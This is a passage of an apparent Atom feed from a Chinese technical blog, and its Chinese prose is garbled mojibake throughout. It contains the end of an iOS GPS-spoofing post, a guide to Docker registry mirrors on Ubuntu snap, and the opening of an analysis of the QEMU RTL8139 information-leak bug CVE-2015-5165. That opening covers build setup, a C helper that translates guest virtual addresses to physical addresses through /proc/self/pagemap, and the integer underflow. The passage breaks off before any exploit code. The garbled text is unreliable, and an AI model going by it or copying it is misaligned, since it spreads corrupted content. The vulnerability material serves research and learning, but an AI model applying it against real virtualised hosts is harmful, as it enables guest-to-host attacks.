ä½ç½®çš„æ–¹æ³•å¼Šç«¯ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œä¹‹å‰çœ‹åˆ°æœ‰äººåœ¨ HITB ä¸Šè®²è¿‡ <a href="https://cyberweek.ae/materials/2020/COMMSEC%20D2%20-%20Spoofing%20Your%20Location%20on%20iOS%20without%20Jailbreaking.pdf" target="_blank" rel="noopener">PhantomGPS</a>ï¼Œç›¸å¯¹æ¥è¯´æ–¹ä¾¿å’Œçµæ´»äº†å¾ˆå¤šï¼ŒäºŒä»£å”®ä»· 400 å—ã€‚</p><h2 id="0x04-å‚è€ƒæ–‡æ¡£"><a href="#0x04-å‚è€ƒæ–‡æ¡£" class="headerlink" title="0x04. å‚è€ƒæ–‡æ¡£"></a>0x04. å‚è€ƒæ–‡æ¡£</h2><ol><li><a href="https://zh.wikipedia.org/wiki/%E4%B8%96%E7%95%8C%E5%A4%A7%E5%9C%B0%E6%B5%8B%E9%87%8F%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">World Geodetic System - Wikipedia</a></li><li><a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E5%9C%B0%E7%90%86%E6%95%B0%E6%8D%AE%E9%99%90%E5%88%B6#GCJ-02" target="_blank" rel="noopener">GCJ-02 - Wikipedia</a></li><li><a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E5%9C%B0%E7%90%86%E6%95%B0%E6%8D%AE%E9%99%90%E5%88%B6#BD-09" target="_blank" rel="noopener">BD-09 - Wikipedia</a></li><li><a href="https://steppark.net/15294912961206.html" target="_blank" rel="noopener">å¦™ç”¨ Xcode ä¿®æ”¹ iPhone çš„å½“å‰å®šä½ä½ç½®</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœªè¶Šç‹± iOS è®¾å¤‡é€šè¿‡ Xcode ä¿®æ”¹ GPS å®šä½ä¿¡æ¯ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Apple" scheme="https://programlife.net/categories/Apple/"/>
    
      <category term="iOS" scheme="https://programlife.net/categories/Apple/iOS/"/>
    
    
      <category term="iOS" scheme="https://programlife.net/tags/iOS/"/>
    
      <category term="GPS" scheme="https://programlife.net/tags/GPS/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu Snap Docker å›½å†…åŠ é€Ÿé•œåƒè®¾ç½®</title>
    <link href="https://programlife.net/2020/09/12/ubuntu-snap-docker-registry-mirrors/"/>
    <id>https://programlife.net/2020/09/12/ubuntu-snap-docker-registry-mirrors/</id>
    <published>2020-09-12T00:13:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸º Ubuntu ä¸‹é€šè¿‡ Snap å®‰è£…çš„ Docker è®¾ç½®å›½å†…åŠ é€Ÿé•œåƒï¼ˆRegistry Mirrorsï¼‰ã€‚</p><a id="more"></a><p>å…³äº Ubuntu ä¸‹ Docker å›½å†…åŠ é€Ÿé•œåƒçš„è®¾ç½®ï¼Œç›®å‰æœç´¢å¼•æ“èƒ½æœåˆ°çš„æ–‡ç« å¤§éƒ¨åˆ†éƒ½æ˜¯é’ˆå¯¹ apt å®‰è£…çš„ Docker çš„ï¼Œä¸»è¦é€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶ <code>/etc/docker/daemon.json</code> æ·»åŠ å›½å†…åŠ é€Ÿé•œåƒåœ°å€ï¼ˆä»¥ä¸­ç§‘å¤§ä¸ºä¾‹ï¼‰ï¼š</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"registry-mirrors"</span>: [<span class="string">"https://docker.mirrors.ustc.edu.cn/"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›¸å…³åŠ é€Ÿé•œåƒè¿˜æœ‰ï¼š</p><ol><li>Docker å®˜æ–¹é•œåƒ <code>https://registry.docker-cn.com</code></li><li>ç½‘æ˜“é•œåƒ <code>https://hub-mirror.c.163.com</code></li><li>è…¾è®¯é•œåƒ <code>https://mirror.ccs.tencentyun.com</code></li><li>ä¸ƒç‰›é•œåƒ <code>https://reg-mirror.qiniu.com</code></li><li>é˜¿é‡Œäº‘é•œåƒï¼ˆéœ€è¦æ³¨å†Œç™»é™†ï¼Œæ— å…¬å¼€åœ°å€ï¼‰</li></ol><p>ç›®å‰æœ€æ–°çš„ Ubuntu 20.04 ä½¿ç”¨ snap å®‰è£… Docker éå¸¸æ–¹ä¾¿ï¼Œä¸éœ€è¦ä¿®æ”¹æºçš„è®¾ç½®ï¼Œç›´æ¥ä¸€æ¡å‘½ä»¤å³å¯å®‰è£…ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo snap install docker</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä¸Šè¿°å›½å†…åŠ é€Ÿé•œåƒçš„è®¾ç½®æ–¹æ³•å¯¹é€šè¿‡ snap å®‰è£…çš„ Docker æ— æ•ˆï¼é€šè¿‡ snap å®‰è£…çš„ Docker çš„é…ç½®æ–‡ä»¶ä½äº <code>/var/snap/docker/current/config/daemon.json</code> ï¼Œå¾€å…¶ä¸­æ·»åŠ åŠ é€Ÿé•œåƒçš„è®¾ç½®å³å¯ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span> cat /var/snap/docker/current/config/daemon.json</span><br><span class="line">&#123;</span><br><span class="line">    "log-level":        "error",</span><br><span class="line">    "storage-driver":   "overlay2",</span><br><span class="line">    "registry-mirrors": ["https://hub-mirror.c.163.com"]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è®¾ç½®å¥½ä¹‹åé€šè¿‡ snap é‡å¯ Docker æœåŠ¡ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo snap restart docker</span><br></pre></td></tr></table></figure><p>é€šè¿‡ <code>docker info</code> å‘½ä»¤æ£€æŸ¥è®¾ç½®æ˜¯å¦ç”Ÿæ•ˆï¼ˆè§‚å¯Ÿ <strong>Registry Mirrors</strong> å­—æ®µï¼‰ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Registry: https://index.docker.io/v1/</span><br><span class="line">Labels:</span><br><span class="line">Experimental: false</span><br><span class="line">Insecure Registries:</span><br><span class="line"> 127.0.0.0/8</span><br><span class="line">Registry Mirrors:</span><br><span class="line"> https://hub-mirror.c.163.com/</span><br><span class="line">Live Restore Enabled: false</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä¸º Ubuntu ä¸‹é€šè¿‡ Snap å®‰è£…çš„ Docker è®¾ç½®å›½å†…åŠ é€Ÿé•œåƒï¼ˆRegistry Mirrorsï¼‰ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Virtualization" scheme="https://programlife.net/categories/Virtualization/"/>
    
      <category term="Docker" scheme="https://programlife.net/categories/Virtualization/Docker/"/>
    
    
      <category term="Ubuntu" scheme="https://programlife.net/tags/Ubuntu/"/>
    
      <category term="Snap" scheme="https://programlife.net/tags/Snap/"/>
    
      <category term="Docker" scheme="https://programlife.net/tags/Docker/"/>
    
      <category term="daemon.json" scheme="https://programlife.net/tags/daemon-json/"/>
    
  </entry>
  
  <entry>
    <title>QEMU ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2015-5165 åˆ†æåŠåˆ©ç”¨</title>
    <link href="https://programlife.net/2020/06/30/cve-2015-5165-qemu-rtl8139-vulnerability-analysis/"/>
    <id>https://programlife.net/2020/06/30/cve-2015-5165-qemu-rtl8139-vulnerability-analysis/</id>
    <published>2020-06-30T00:13:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>å‚è€ƒ Phrack æ–‡ç«  <strong><em>VM escape - QEMU Case Study</em></strong> [1] å¯¹ QEMU ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2015-5165 å’Œå †æº¢å‡ºæ¼æ´ CVE-2015-7504 è¿›è¡Œè°ƒè¯•åˆ†æå¹¶ç¼–å†™ Exploit ä»£ç ï¼Œæœ¬æ–‡ä¸»è¦åˆ†æå…¶ä¸­çš„ RTL8139 ç½‘å¡ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2015-5165ã€‚</p><a id="more"></a><h2 id="0x01-ç¯å¢ƒæ­å»º"><a href="#0x01-ç¯å¢ƒæ­å»º" class="headerlink" title="0x01. ç¯å¢ƒæ­å»º"></a>0x01. ç¯å¢ƒæ­å»º</h2><h3 id="1-1-å®¿ä¸»æœºåˆ›å»º"><a href="#1-1-å®¿ä¸»æœºåˆ›å»º" class="headerlink" title="1.1 å®¿ä¸»æœºåˆ›å»º"></a>1.1 å®¿ä¸»æœºåˆ›å»º</h3><p>åœ¨ VMware Workstation ä¸­åˆ›å»º Ubuntu 20.04 è™šæ‹Ÿæœºï¼Œå¹¶ä¸ºè™šæ‹Ÿæœºçš„ CPU å¼€å¯è™šæ‹ŸåŒ–å¼•æ“ç›¸å…³é€‰é¡¹ï¼Œä½¿ä¹‹æ”¯æŒåµŒå¥—è™šæ‹ŸåŒ–ï¼Œä»¥ä¾¿å¯¹ QEMU è¿›è¡Œè°ƒè¯•åˆ†æã€‚</p><p>å®‰è£…å¥½ Ubuntu ä¹‹åï¼Œå¯ä»¥å…ˆå°†æºè®¾ç½®ä¸ºå›½å†…çš„å¼€æºé•œåƒç½‘ç«™ï¼Œä¹‹åæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤æ›´æ–°ç³»ç»Ÿç»„ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get update</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get upgrade</span></span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ QEMU éœ€è¦ Python 2ï¼Œå› ä¸º Ubuntu 20.04 ä¸­åªæœ‰ Python 3ï¼Œæ‰€ä»¥éœ€è¦è‡ªè¡Œå®‰è£… Python 2ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install python2</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ln -s /usr/bin/python2 /usr/bin/python</span></span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ QEMU æ‰€ä¾èµ–çš„å…¶ä»–åº“ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install zlib1g-dev libglib2.0-dev libpixman-1-dev</span></span><br></pre></td></tr></table></figure><h3 id="1-2-QEMU-ç¼–è¯‘"><a href="#1-2-QEMU-ç¼–è¯‘" class="headerlink" title="1.2 QEMU ç¼–è¯‘"></a>1.2 QEMU ç¼–è¯‘</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> git://git.qemu-project.org/qemu.git</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> qemu</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout bd80b59</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mkdir -p bin/debug/native</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> bin/debug/native</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ../../../configure --target-list=x86_64-softmmu \</span></span><br><span class="line">    --enable-debug --disable-werror</span><br><span class="line"><span class="meta">$</span><span class="bash"> make</span></span><br></pre></td></tr></table></figure><p>å¦‚æœå‡ºç°ä»¥ä¸‹é”™è¯¯ï¼Œç»™æ–‡ä»¶ <code>commands-posix.c</code> å¢åŠ å¤´æ–‡ä»¶ <code>&lt;sys/sysmacros.h&gt;</code> å³å¯è§£å†³ [2]ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/usr/bin/ld: qga/commands-posix.o: in function `dev_major_minor':</span><br><span class="line">/repo/qemu/qga/commands-posix.c:640: undefined reference to `major'</span><br><span class="line">/usr/bin/ld: /repo/qemu/qga/commands-posix.c:641: undefined reference to `minor'</span><br></pre></td></tr></table></figure><h3 id="1-3-è™šæ‹Ÿæœºåˆ›å»º"><a href="#1-3-è™šæ‹Ÿæœºåˆ›å»º" class="headerlink" title="1.3 è™šæ‹Ÿæœºåˆ›å»º"></a>1.3 è™šæ‹Ÿæœºåˆ›å»º</h3><p>QEMU ç¼–è¯‘å®Œæˆä¹‹åï¼Œéœ€è¦åˆ›å»ºä¸€ä¸ªç”¨äºè°ƒè¯•æ¼æ´çš„è™šæ‹Ÿæœºã€‚ä¸ºäº†è°ƒè¯•æ–¹ä¾¿ï¼Œè¿™é‡Œå®‰è£… Ubuntu 20.04 Server ç‰ˆæœ¬ï¼ˆæ¯”è¾ƒæ–°çš„ Ubuntu Server æ²¡æœ‰ 32 ä½çš„ç‰ˆæœ¬ï¼Œä½†è¿™é‡Œå»ºè®®å®‰è£…ä¸€ä¸ª 32 ä½çš„ç³»ç»Ÿï¼Œå› ä¸ºåé¢çš„ PoC å’Œ Exploit éƒ½æ˜¯é’ˆå¯¹ 32 ä½ç¯å¢ƒç¼–å†™çš„ï¼‰ï¼Œç›¸å…³å‘½ä»¤å¦‚ä¸‹æ‰€ç¤º [3]ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./qemu-img create -f qcow2 ~/Desktop/vm/ubuntu.img 10G</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> x86_64-softmmu/qemu-system-x86_64 -<span class="built_in">enable</span>-kvm -boot d -cdrom \</span></span><br><span class="line">    /mnt/hgfs/share/ubuntu-20.04-live-server-amd64.iso \</span><br><span class="line">    -hda ~/Desktop/vm/ubuntu.img -m 1024</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜éœ€è¦å®‰è£…ä¸€ä¸ª VNC Viewer [4]ï¼Œä»¥ä¾¿è¿œç¨‹è®¿é—®è™šæ‹Ÿæœºï¼Œä¸‹è½½ deb å®‰è£…åŒ…åä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œå®‰è£…ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo dpkg -i VNC-Viewer-6.20.529-Linux-x64.deb</span></span><br></pre></td></tr></table></figure><p>ä¹‹åå°±å¯ä»¥é€šè¿‡ VNC Viewer æ¥è®¿é—®è™šæ‹Ÿæœºäº†ã€‚</p><h2 id="0x02-å†…å­˜æ˜ å°„"><a href="#0x02-å†…å­˜æ˜ å°„" class="headerlink" title="0x02. å†…å­˜æ˜ å°„"></a>0x02. å†…å­˜æ˜ å°„</h2><p>å’Œ Host æ“ä½œç³»ç»Ÿä¸€æ ·ï¼ŒGuest æ“ä½œç³»ç»Ÿä¸­çš„æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œè¿™é‡Œç§°ä¹‹ä¸º Guest Virtual Addressï¼Œå³ GVAï¼›é€šè¿‡è¿›ç¨‹è‡ªèº«çš„é¡µè¡¨ï¼ˆPage Tableï¼‰ï¼ŒGuest æ“ä½œç³»ç»Ÿå¯ä»¥å°† GVA è½¬æ¢ä¸ºå¯¹åº”çš„ GPAï¼ˆGuest Physical Addressï¼‰ã€‚</p><p>Guest æ“ä½œç³»ç»Ÿçš„ GPAï¼Œå®é™…ä¸Šæ˜¯å¯¹åº”çš„ QEMU è¿›ç¨‹ä¸­æ˜ å°„çš„è™šæ‹Ÿå†…å­˜ï¼Œå³ HVAï¼ˆHost Virtual Addressï¼‰ï¼›Host æ“ä½œç³»ç»ŸåŒæ ·é€šè¿‡å¯¹åº”è¿›ç¨‹çš„é¡µè¡¨ï¼Œæœ€ç»ˆå°†å…¶è½¬æ¢ä¸ºå¯¹åº”çš„ HPAï¼ˆHost Physical Addressï¼‰ã€‚</p><p>å¾… Ubuntu Server è™šæ‹Ÿæœºå®‰è£…å®Œæ¯•åï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤å¯åŠ¨è¯¥è™šæ‹Ÿæœºï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> x86_64-softmmu/qemu-system-x86_64 -<span class="built_in">enable</span>-kvm -m 2048 -drive \</span></span><br><span class="line">    file=~/Desktop/vm/ubuntu.img,format=qcow2,if=ide,cache=writeback</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç»™è™šæ‹Ÿæœºåˆ†é…äº† 2GB çš„å†…å­˜ï¼Œå¯ä»¥åœ¨å¯¹åº”çš„ QEMU è¿›ç¨‹ä¸­æ‰¾åˆ°å¯¹åº”çš„è™šæ‹Ÿå†…å­˜ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ps -e|grep qemu</span></span><br><span class="line">   4407 pts/1    00:01:14 qemu-system-x86</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /proc/4407/maps</span></span><br><span class="line">......</span><br><span class="line">7fe880021000-7fe884000000 ---p 00000000 00:00 0 </span><br><span class="line">7fe884000000-7fe904000000 rw-p 00000000 00:00 0         [2GB RAM]</span><br><span class="line">7fe904000000-7fe90465d000 rw-p 00000000 00:00 0 </span><br><span class="line">......</span><br><span class="line">7ffc9f4a1000-7ffc9f4c2000 rw-p 00000000 00:00 0         [stack]</span><br><span class="line">7ffc9f4fd000-7ffc9f500000 r--p 00000000 00:00 0         [vvar]</span><br><span class="line">7ffc9f500000-7ffc9f501000 r-xp 00000000 00:00 0         [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0 [vsyscall]</span><br></pre></td></tr></table></figure><p>å…³äº Guest Virtual Address åˆ° Host Virtual Address çš„è½¬æ¢ï¼ŒPhrack çš„æ–‡ç« æ²¡æ€ä¹ˆè§£é‡Šï¼Œåœ¨ç½‘ä¸Šæ‰¾åˆ°å¦ä¸€ç¯‡æ–‡ç«  [5] è§£é‡Šçš„æ¯”è¾ƒæ¸…æ¥šï¼ˆä»¥ 64 ä½ç³»ç»Ÿä¸ºä¾‹ï¼‰ï¼š</p><ol><li><p>æ¯ä¸ªé¡µé¢çš„å¤§å°ä¸º <code>4096</code> å­—èŠ‚ï¼Œå³ <code>1 &lt;&lt; 12</code> ï¼›</p></li><li><p>åŸºäº <code>/proc/pid/pagemap</code> å¯ä»¥æŸ¥çœ‹è¿›ç¨‹ä»»æ„ Virtual Page çš„çŠ¶æ€ï¼ŒåŒ…æ‹¬æ˜¯å¦è¢«æ˜ å°„åˆ°ç‰©ç†å†…å­˜ä»¥åŠåœ¨ç‰©ç†å†…å­˜ä¸­çš„ Page Frame Numberï¼ˆPFNï¼‰ç­‰ï¼›</p><ul><li><code>pagemap</code> æ–‡ä»¶ä¸ºæ¯ä¸ª Virtual Page å­˜å‚¨ <code>64</code> ä½ï¼ˆå³ <code>8</code> å­—èŠ‚ï¼‰çš„ä¿¡æ¯ï¼Œæ•°æ®æ ¼å¼å¦‚ä¸‹ï¼š</li></ul></li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Bits 0-54  page frame number (PFN) if present</span><br><span class="line">Bits 0-4   swap type if swapped</span><br><span class="line">Bits 5-54  swap offset if swapped</span><br><span class="line">Bit  55    pte is soft-dirty</span><br><span class="line">Bit  56    page exclusively mapped (since 4.2)</span><br><span class="line">Bits 57-60 zero</span><br><span class="line">Bit  61    page is file-page or shared-anon (since 3.5)</span><br><span class="line">Bit  62    page swapped</span><br><span class="line">Bit  63    page present</span><br></pre></td></tr></table></figure><ol start="3"><li><p>å¯¹ä»»æ„çš„è™šæ‹Ÿåœ°å€ <code>address</code> ï¼ŒåŸºäº <code>address / 4096</code> å¯ä»¥è®¡ç®—å‡ºè¯¥è™šæ‹Ÿåœ°å€åœ¨ <code>pagemap</code> æ–‡ä»¶ä¸­çš„ç´¢å¼•å€¼ï¼Œ <code>address / 4096 * 8</code> å³å¯¹åº”çš„æ–‡ä»¶åç§»å€¼ï¼›</p></li><li><p>å¯¹ä»»æ„çš„è™šæ‹Ÿåœ°å€ <code>address</code> ï¼Œ<code>address % 4096</code> å³è™šæ‹Ÿåœ°å€åœ¨å¯¹åº”çš„å†…å­˜é¡µä¸­çš„åç§»å€¼ï¼›</p></li><li><p>åŸºäºç‰©ç†å†…å­˜çš„ PFN ä»¥åŠé¡µå†…åç§»ï¼Œå°±å¯ä»¥è®¡ç®—å‡ºå¯¹åº”çš„ç‰©ç†åœ°å€ï¼›</p></li></ol><p>è·å–è™šæ‹Ÿåœ°å€å¯¹åº”çš„ç‰©ç†åœ°å€çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> get_physical_pfn(<span class="keyword">char</span>* ptr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = <span class="number">-1</span>;</span><br><span class="line">    FILE* fp = fopen(<span class="string">"/proc/self/pagemap"</span>, <span class="string">"rb"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> pfn;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!fseek(fp, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr / PAGE_SIZE * <span class="number">8</span>, SEEK_SET)) </span><br><span class="line">    &#123;</span><br><span class="line">        fread(&amp;pfn, <span class="keyword">sizeof</span>(pfn), <span class="number">1</span>, fp);</span><br><span class="line">        <span class="keyword">if</span> (pfn &amp; PFN_PRESENT) </span><br><span class="line">        &#123;</span><br><span class="line">            pfn &amp;= PFN_PFN;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> pfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> get_physical_addr(<span class="keyword">char</span>* ptr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = get_physical_pfn(ptr);</span><br><span class="line">    <span class="keyword">return</span> pfn * PAGE_SIZE + (<span class="keyword">uint64_t</span>)ptr % PAGE_SIZE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* ptr = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(ptr, <span class="string">"Where am I?"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Physical address: 0x%"</span> PRIx64 <span class="string">"\n"</span>, get_physical_addr(ptr));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Press any key to exit...\n"</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¹æ®æ–‡æ¡£ [6] å¯çŸ¥ï¼Œåªæœ‰æ‹¥æœ‰ <code>CAP_SYS_ADMIN</code> æƒé™çš„è¿›ç¨‹æ‰å¯ä»¥è¯»å–åˆ° PFNï¼Œå¦åˆ™è™½ç„¶å¯ä»¥æ‰“å¼€ <code>pagemap</code> æ–‡ä»¶ï¼Œä½†æ˜¯è¯»å–åˆ°çš„ PFN å°†ä¼šæ˜¯ <code>0</code> ã€‚</p><blockquote><p>Since Linux 4.0 only users with the CAP_SYS_ADMIN capability can get PFNs.<br>In 4.0 and 4.1 opens by unprivileged fail with -EPERM.  Starting from<br>4.2 the PFN field is zeroed if the user does not have CAP_SYS_ADMIN.<br>Reason: information about PFNs helps in exploiting Rowhammer vulnerability.</p></blockquote><p>ç¼–è¯‘å¥½ç¨‹åºä¹‹åå°†å…¶ä¸Šä¼ åˆ° QEMU è™šæ‹Ÿæœºä¸­ä»¥ <code>root</code> èº«ä»½æ‰§è¡Œï¼Œæ‰“å°å‡ºç‰©ç†åœ°å€ä¸º <code>0x617192a0</code> ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo ./a.out</span></span><br><span class="line">Where am I?</span><br><span class="line">Physical address: 0x617192a0</span><br><span class="line">Press any key to exit...</span><br></pre></td></tr></table></figure><p>åœ¨å®¿ä¸»æœºä¸­ä½¿ç”¨ GDB é™„åŠ åˆ° QEMU è¿›ç¨‹ï¼Œå¯ä»¥çœ‹åˆ°è™šæ‹Ÿæœºä¸­çš„ç‰©ç†åœ°å€å®é™…ä¸Šå°±æ˜¯ QEMU è¿›ç¨‹ä¸ºè™šæ‹Ÿæœºåˆ†é…çš„å†…å­˜æ‰€åœ¨çš„ Host Virtual Address çš„åç§»åœ°å€ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo gdb qemu-system-x86 4407</span></span><br><span class="line">(gdb) x /s 0x7fe884000000 + 0x617192a0</span><br><span class="line">0x7fe8e57192a0:"Where am I?"</span><br></pre></td></tr></table></figure><h2 id="0x03-æ¼æ´åˆ†æ"><a href="#0x03-æ¼æ´åˆ†æ" class="headerlink" title="0x03. æ¼æ´åˆ†æ"></a>0x03. æ¼æ´åˆ†æ</h2><h3 id="3-1-æ¼æ´ç®€ä»‹"><a href="#3-1-æ¼æ´ç®€ä»‹" class="headerlink" title="3.1 æ¼æ´ç®€ä»‹"></a>3.1 æ¼æ´ç®€ä»‹</h3><p>CVE-2015-5165 æ˜¯ QEMU åœ¨æ¨¡æ‹Ÿ Realtek RTL8139 ç½‘å¡æ—¶å­˜åœ¨çš„ä¸€ä¸ªæ¼æ´ï¼Œå…·ä½“ä¸ºæ–‡ä»¶ <code>hw\net\rtl8139.c</code> ä¸­çš„å‡½æ•° <code>rtl8139_cplus_transmit_one</code> åœ¨å‘é€æ•°æ®æ—¶æ²¡æœ‰æ£€æŸ¥ IP æ•°æ®åŒ…å¤´éƒ¨çš„é•¿åº¦ <code>hlen</code> ä¸æ•´ä¸ª IP æ•°æ®åŒ…çš„é•¿åº¦ <code>ip-&gt;ip_len</code> ä¹‹é—´çš„å…³ç³»ï¼Œå¯¼è‡´åœ¨è®¡ç®—æ•°æ®é•¿åº¦çš„æ—¶å€™å­˜åœ¨æ•´æ•°æº¢å‡ºï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*uint16_t*/</span> ip_data_len = be16_to_cpu(ip-&gt;ip_len) - hlen;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨è¯¥æ¼æ´å¯ä»¥æŠŠè¶Šç•Œè¯»å–åˆ°çš„æ•°æ®é€šè¿‡ç½‘ç»œå‘é€å‡ºå»ã€‚</p><h3 id="3-2-åŸºç¡€çŸ¥è¯†"><a href="#3-2-åŸºç¡€çŸ¥è¯†" class="headerlink" title="3.2 åŸºç¡€çŸ¥è¯†"></a>3.2 åŸºç¡€çŸ¥è¯†</h3><h4 id="3-2-1-Ethernet-Frame-Format"><a href="#3-2-1-Ethernet-Frame-Format" class="headerlink" title="3.2.1 Ethernet Frame Format"></a>3.2.1 Ethernet Frame Format</h4><p>OSIï¼ˆOpen Systems Interconnectionï¼‰å°†ç½‘ç»œåè®®åˆ†ä¸ºä¸ƒå±‚ï¼Œä»ä¸Šå¾€ä¸‹ä¾æ¬¡ä¸ºï¼š</p><ul><li>åº”ç”¨å±‚</li><li>è¡¨ç¤ºå±‚</li><li>ä¼šè¯å±‚</li><li>ä¼ è¾“å±‚</li><li>ç½‘ç»œå±‚</li><li>æ•°æ®é“¾è·¯å±‚</li><li>ç‰©ç†å±‚</li></ul><p>ä»¥å¤ªç½‘å¸§ï¼ˆEthernet Frameï¼‰åœ¨æ•°æ®é“¾è·¯å±‚ä¼ è¾“ï¼Œæ 